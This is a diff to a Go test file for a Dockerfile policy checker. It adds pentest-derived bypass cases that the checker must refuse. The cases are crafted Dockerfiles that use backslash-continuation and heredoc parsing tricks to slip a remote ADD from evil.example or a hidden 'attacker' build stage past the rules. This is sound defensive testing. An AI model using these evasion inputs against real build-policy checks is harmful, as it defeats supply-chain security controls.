@@ -24,7 +24,6 @@ func TestCheckDockerfileAccepts(t *testing.T) {
 		"urls elsewhere":  {"FROM alpine:3\nLABEL org.opencontainers.image.source=https://example.com/x\nRUN echo https://example.com\n", []string{"alpine:3"}},
 		"tabs and crlf":   {"FROM\talpine:3\r\nRUN\ttrue\r\n", []string{"alpine:3"}},
 		"plain comments":  {"#!/usr/bin/env docker\n# Build the app.\nFROM alpine:3\n  # indented comment\n", []string{"alpine:3"}},
-		"heredoc":         {"FROM alpine:3\nRUN <<EOF\necho hi\nEOF\n", []string{"alpine:3"}},
 		"healthcheck":     {"FROM alpine:3\nHEALTHCHECK --interval=5s CMD true\n", []string{"alpine:3"}},
 		"boolean flags":   {"FROM alpine:3\nCOPY --link a /a\nCOPY --parents --LINK=false b /b\nADD --link c /c\n", []string{"alpine:3"}},
 		"mount types":     {"FROM alpine:3\nRUN --mount=type=tmpfs,target=/t --mount=type=bind,source=x,target=/x --mount=target=/y true\n", []string{"alpine:3"}},
@@ -104,7 +103,15 @@ var dockerfileBypasses = map[string]struct{ file, rule string }{
 	"flag as image":               {"FROM -x\n", ruleImageName},
 	"image with space":            {"FROM alpine 3\n", ruleImageName},
 	"no from":                     {"RUN true\n", ruleNoFrom},
-	"too many images":             {manyImages(maxBaseImages + 1), ruleTooManyImages},
+	// v0.2 release pentest F1-F3, each checked against BuildKit's parser.
+	"double backslash ends line": {"FROM busybox\nRUN x\\\\\nADD http://evil.example/a /a\n", ruleRemoteAdd},
+	"heredoc hash end word":      {"FROM busybox\nRUN <<#X\nx \\\n#X\nADD http://evil.example/a /a\n", ruleHeredoc},
+	"heredoc body stage":         {"FROM busybox\nRUN <<EOF\nFROM scratch AS attacker\nEOF\nCOPY --from=attacker / /x\n", ruleHeredoc},
+	"heredoc dash":               {"FROM busybox\nCOPY <<-EOF /x\nhi\nEOF\n", ruleHeredoc},
+	"heredoc fd":                 {"FROM busybox\nRUN 3<<EOF cat <&3\nhi\nEOF\n", ruleHeredoc},
+	"heredoc continued":          {"FROM busybox\nADD \\\n<<EOF /x\nhi\nEOF\n", ruleHeredoc},
+	"lone backslash continues":   {"FROM busybox\nADD \\\n\\\nhttps://example.com/x /x\n", ruleRemoteAdd},
+	"too many images":            {manyImages(maxBaseImages + 1), ruleTooManyImages},
 }
 
 // TestDockerfileBypassesRefused is the protection test for the
